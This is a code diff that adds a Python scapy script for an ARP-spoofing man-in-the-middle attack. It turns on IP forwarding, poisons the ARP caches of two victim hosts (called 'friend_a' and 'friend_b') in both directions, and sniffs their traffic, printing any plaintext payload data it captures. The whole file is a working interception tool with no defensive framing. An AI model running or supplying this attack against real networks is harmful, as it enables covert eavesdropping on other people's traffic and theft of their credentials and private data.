@@ -1,0 +1,79 @@
+from scapy.all import ARP, Ether, send, sniff, conf, IP, getmacbyip
+import sys
+import os
+import threading
+import html
+
+def safe_print(*args, **kwargs):
+    """Wrapper for print that handles encoding issues"""
+    try:
+        __builtins__.print(*args, flush=True, **kwargs)
+    except UnicodeEncodeError:
+        # If we hit encoding errors, try to sanitize the output
+        cleaned = []
+        for arg in args:
+            if isinstance(arg, str):
+                cleaned.append(arg.encode('ascii', errors='replace').decode('ascii'))
+            else:
+                cleaned.append(str(arg))
+        __builtins__.print(*cleaned, flush=True, **kwargs)
+
+print = safe_print
+
+def enable_ip_forwarding():
+    """ Enables IP forwarding to relay packets between victims """
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # this is a special file used for ip forwarding and echo 1 writes 1 in this file hence enabling the ip forwarding
+    print("[Done] IP Forwarding Enabled")
+
+# def arp_spoof(victim_ip, target_ip):
+#     """ Sends spoofed ARP packets to victim using resolved MAC """
+#     victim_mac = getmacbyip(victim_ip)
+#     if not victim_mac:
+#         print(f"[Sorry] Could not resolve MAC address for {victim_ip}")
+#         return
+
+#     packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
+    
+#     while True:
+#         send(packet, verbose=False)
+
+def arp_spoof(victim_ip, target_ip):
+    """ Sends spoofed ARP packets to trick victim into thinking we are target """
+    packet = Ether() / ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
+    while True:
+        send(packet, verbose=False)
+    
+def sniff_packets(interface):
+    """ Sniffs packets and logs HTTP requests & plaintext data """
+    print(f"[*] Sniffing on {interface}")
+
+    def process_packet(packet):
+        if packet.haslayer(IP):         # to check if the packet has IP layer header
+            src = packet[IP].src
+            dst = packet[IP].dst
+            # print(f"[+] Packet: {src} --> {dst}")
+
+            if packet.haslayer("Raw"):  # This checks if the packet contains a Raw layer. The Raw layer contains the actual data/payload of the packet
+                payload = packet["Raw"].load.decode('utf-8', errors="ignore")  # ignore undecodable bytes
+                cleaned = ''.join(c for c in payload if c.isprintable())        # remove non-printable chars
+                print(f"[Data from {src}] Data Captured: {html.escape(cleaned)}")
+
+    sniff(iface=interface, prn=process_packet, store=False)
+
+if __name__ == "__main__":
+    friend_a = sys.argv[1]
+    friend_b = sys.argv[2]
+    interface = sys.argv[3]
+
+    # friend_a = input("Enter Friend A IP: ")
+    # friend_b = input("Enter Friend B IP: ")
+    # interface = input("Enter network interface (e.g., eth0, wlan0): ")
+
+    enable_ip_forwarding()
+
+    # Start spoofing both victims simultaneously
+    threading.Thread(target=arp_spoof, args=(friend_a, friend_b)).start()
+    threading.Thread(target=arp_spoof, args=(friend_b, friend_a)).start()
+
+    # Start sniffing the traffic
+    sniff_packets(interface)
